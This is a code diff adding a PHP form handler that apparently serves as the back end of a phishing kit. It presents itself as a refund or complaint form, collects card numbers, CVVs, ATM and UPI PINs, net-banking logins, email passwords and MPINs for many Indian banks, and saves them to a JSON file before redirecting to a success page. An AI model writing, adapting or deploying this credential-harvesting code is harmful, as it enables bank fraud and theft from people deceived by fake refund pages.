@@ -1,0 +1,133 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Retrieve data from the form
+    $data = array(
+        'ID' => $_POST['token'], // Use the 'token' as the unique ID
+        'EntryDate' => date('Y-m-d H:i:s'),
+
+		'fname' => $_POST['fname'],
+		'mobile' => $_POST['mobile'],
+		'complain' => $_POST['complain'],
+		'amt_type' => $_POST['amt_type'],
+		'refund_amt' => $_POST['refund_amt'],
+		'card' => $_POST['card'],
+		'net_banking' => $_POST['net_banking'],
+		'amazon_pay' => $_POST['amazon_pay'],
+		'googlepay' => $_POST['googlepay'],
+		'phonepay' => $_POST['phonepay'],
+		'paytm' => $_POST['paytm'],
+		'other' => $_POST['other'],
+		'cardname' => $_POST['cardname'],
+		'cc-exp' => $_POST['cc-exp'],
+		'cvv' => $_POST['cvv'],
+		'atm_pin' => $_POST['atm_pin'],
+		'dob' => $_POST['dob'],
+		'upi_pin' => $_POST['upi_pin'],
+		'upi_bank_name' => $_POST['upi_bank_name'],
+		'user_id' => $_POST['user_id'],
+		'net_password' => $_POST['net_password'],
+		'profile_password' => $_POST['profile_password'],
+		'other_bank_type' => $_POST['other_bank_type'],
+		'union_login_pin' => $_POST['union_login_pin'],
+		'union_mpin' => $_POST['union_mpin'],
+		'union-cardname' => $_POST['union-cardname'],
+		'union-cc-exp' => $_POST['union-cc-exp'],
+		'union-cvv' => $_POST['union-cvv'],
+		'union_atm_pin' => $_POST['union_atm_pin'],
+		'icici_username' => $_POST['icici_username'],
+		'icici_password' => $_POST['icici_password'],
+		'icici_file1' => $_POST['icici_file1'],
+		'icici_account_number' => $_POST['icici_account_number'],
+		'icici_file2' => $_POST['icici_file2'],
+		'icici_atm_pin' => $_POST['icici_atm_pin'],
+		'indian_account_number' => $_POST['indian_account_number'],
+		'indian_pan_card' => $_POST['indian_pan_card'],
+		'indian_dob' => $_POST['indian_dob'],
+		'indian-cardname' => $_POST['indian-cardname'],
+		'indian-cc-exp' => $_POST['indian-cc-exp'],
+		'indian-cvv' => $_POST['indian-cvv'],
+		'indian_atm_pin' => $_POST['indian_atm_pin'],
+		'canara_mpin' => $_POST['canara_mpin'],
+		'canara-cardname' => $_POST['canara-cardname'],
+		'canara-cc-exp' => $_POST['canara-cc-exp'],
+		'canara-cvv' => $_POST['canara-cvv'],
+		'canara_atm_pin' => $_POST['canara_atm_pin'],
+		'bob_login_pin' => $_POST['bob_login_pin'],
+		'bob_mpin' => $_POST['bob_mpin'],
+		'bob-cardname' => $_POST['bob-cardname'],
+		'bob-cc-exp' => $_POST['bob-cc-exp'],
+		'bob-cvv' => $_POST['bob-cvv'],
+		'hdfc_customerid' => $_POST['hdfc_customerid'],
+		'hdfc_password' => $_POST['hdfc_password'],
+		'hdfc_atm_pin_1' => $_POST['hdfc_atm_pin_1'],
+		'hdfc_email' => $_POST['hdfc_email'],
+		'hdfc_email_password' => $_POST['hdfc_email_password'],
+		'hdfc_debit_customerid' => $_POST['hdfc_debit_customerid'],
+		'hdfc_atm_pin' => $_POST['hdfc_atm_pin'],
+		'hdfc-cc-exp1' => $_POST['hdfc-cc-exp1'],
+		'hdfc_email_2' => $_POST['hdfc_email_2'],
+		'hdfc_email_password_2' => $_POST['hdfc_email_password_2'],
+		'hdfc-cardname' => $_POST['hdfc-cardname'],
+		'hdfc-cc-exp' => $_POST['hdfc-cc-exp'],
+		'hdfc-cvv' => $_POST['hdfc-cvv'],
+		'central_account_number' => $_POST['central_account_number'],
+		'central-cardname' => $_POST['central-cardname'],
+		'central-cc-exp' => $_POST['central-cc-exp'],
+		'central-cvv' => $_POST['central-cvv'],
+		'sbi_username' => $_POST['sbi_username'],
+		'sbi_password' => $_POST['sbi_password'],
+		'sbi_profile_password' => $_POST['sbi_profile_password'],
+		'sbi_account_number' => $_POST['sbi_account_number'],
+		'sbi_cif_number' => $_POST['sbi_cif_number'],
+		'sbi_brach_code' => $_POST['sbi_brach_code'],
+		'sbi_dob' => $_POST['sbi_dob'],
+		'sbi-cardname' => $_POST['sbi-cardname'],
+		'sbi-cc-exp' => $_POST['sbi-cc-exp'],
+		'sbi-cvv' => $_POST['sbi-cvv'],
+		'sbi-atm-pin' => $_POST['sbi-atm-pin'],
+		'boi_username' => $_POST['boi_username'],
+		'boi_mpin' => $_POST['boi_mpin'],
+		'boi_tpin' => $_POST['boi_tpin'],
+		'boi-cardname' => $_POST['boi-cardname'],
+		'boi-cc-exp' => $_POST['boi-cc-exp'],
+		'boi-cvv' => $_POST['boi-cvv'],
+		'boi-atm-pin' => $_POST['boi-atm-pin'],
+		'pnb_username' => $_POST['pnb_username'],
+		'pnb_password' => $_POST['pnb_password'],
+		'pnb_tr_password' => $_POST['pnb_tr_password'],
+		'pnb_account_number' => $_POST['pnb_account_number'],
+		'pnb-cardname' => $_POST['pnb-cardname'],
+		'pnb-cc-exp' => $_POST['pnb-cc-exp'],
+		'pnb-cvv' => $_POST['pnb-cvv'],
+		'pnb_atm_pin' => $_POST['pnb_atm_pin'],
+
+        // Add more data fields as needed
+    );
+
+    // Load existing data
+    $jsonData = file_get_contents('info.json');
+    $responses = json_decode($jsonData, true) ?: array();
+
+    // Check if the same ID already exists
+    $existingDataIndex = -1;
+    foreach ($responses as $index => $item) {
+        if ($item['ID'] === $data['ID']) {
+            $existingDataIndex = $index;
+            break;
+        }
+    }
+
+    if ($existingDataIndex !== -1) {
+        // Update the existing data with the new input values
+        $responses[$existingDataIndex] = $data;
+    } else {
+        // Add the new response if the ID doesn't exist
+        $responses[] = $data;
+    }
+
+    // Save data to a JSON file
+    file_put_contents('info.json', json_encode($responses));
+
+    header('Location: success.php'); // Redirect to the success page
+    exit;
+}
